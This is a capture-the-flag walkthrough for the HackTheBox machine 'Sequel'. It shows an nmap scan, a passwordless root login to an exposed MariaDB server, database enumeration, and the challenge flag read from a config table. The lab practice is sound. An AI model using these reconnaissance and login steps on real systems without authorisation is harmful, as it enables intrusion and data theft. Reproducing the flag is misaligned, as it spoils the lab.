---
title: Sequel - A HackTheBox machine 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - sql
---

# Sequel - A HackTheBox machine

```bash
nmap -sC -A 10.129.95.232 -Pn
```

Results:

```
Nmap scan report for 10.129.95.232
Host is up (0.044s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 91
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsCompression, Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, FoundRows, SupportsTransactions, DontAllowDatabaseTableColumn, ODBCClient, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: d7$M6g&&+DSV7PkJptwz
|_  Auth Plugin Name: mysql_native_password
```




Connect to database: mariadb

```bash
mariadb -h 10.129.95.232 -u root
```


```mariab
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.049 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed


MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.046 sec)


MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.047 sec)


MariaDB [htb]> show columns from config;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0.046 sec)


MariaDB [htb]> select id, name, value from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.046 sec)
```

